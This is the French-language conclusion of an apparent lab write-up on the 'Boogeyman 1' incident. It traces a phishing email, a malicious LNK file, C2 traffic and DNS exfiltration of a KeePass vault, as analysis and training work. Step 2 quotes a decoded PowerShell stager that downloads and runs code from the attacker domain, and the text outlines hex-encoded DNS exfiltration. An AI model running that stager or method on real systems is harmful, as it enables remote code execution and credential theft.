## Conclusion – Résumé de l'attaque (Boogeyman 1)

L'incident Boogeyman 1 reconstitue une chaîne d'attaque complète visant Julianne,
employée du service financier de Quick Logistics LLC, depuis un e-mail de phishing
jusqu'à l'exfiltration de son coffre de mots de passe. L'attaque est attribuée au
groupe **Boogeyman**, qui cible le secteur de la logistique.

1. **Accès initial (Initial Access) – Phishing**
   Julianne reçoit un e-mail de relance sur une facture impayée, se faisant passer
   pour le partenaire B Packaging Inc. L'e-mail contient une archive jointe
   (`Invoice.zip`) qui dissimule un fichier de raccourci malveillant (`.lnk`).

2. **Exécution (Execution)**
   Le fichier LNK, une fois ouvert, lance une commande **PowerShell** encodée en
   base64 (UTF-16). Décodée, elle révèle un *stager* :
   `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`
   → téléchargement et exécution **en mémoire** de la charge suivante (technique
   *fileless*).

3. **Command & Control (C2)**
   Le poste communique avec le C2 `files.bpakcaging.xyz` (167.71.211.113). Via des
   requêtes HTTP **GET**, l'attaquant récupère ses outils : `/update`, puis des
   binaires comme `sq3.exe` (sqlite3) servant à lire des données locales.

4. **Collecte (Collection)**
   L'attaquant accède à des fichiers sensibles sur le poste, dont la **base de
   mots de passe KeePass** (`.kdbx`) de Julianne.

5. **Exfiltration (Exfiltration over DNS)**
   Les données volées sont découpées, encodées en **hexadécimal** et exfiltrées
   **via des requêtes DNS** : chaque morceau est placé dans un sous-domaine de
   `bpakcaging.xyz`. En reconstituant puis décodant ces requêtes, on récupère le
   fichier `.kdbx` d'origine.

6. **Impact**
   Le mot de passe maître du coffre KeePass a été retrouvé **en clair dans les logs
   PowerShell**. Combiné au fichier `.kdbx` exfiltré, il permet d'ouvrir le coffre :
   l'ensemble des identifiants stockés par Julianne est donc **effectivement
   compromis**, et non simplement menacé.

**Bilan :** un seul e-mail de phishing avec une pièce jointe piégée a suffi à
obtenir une exécution de code, à voler le gestionnaire de mots de passe de la
victime et à l'exfiltrer discrètement par un canal DNS — un protocole souvent peu
surveillé. La compromission d'un coffre de mots de passe élargit l'impact à tous
les comptes qu'il contenait, d'où une réponse à incident qui impose la
réinitialisation de l'ensemble de ces accès.

**Artefacts clés de l'investigation :** e-mail de phishing (`dump.eml`), logs
PowerShell (`powershell.json`), capture réseau (`capture.pcapng`).
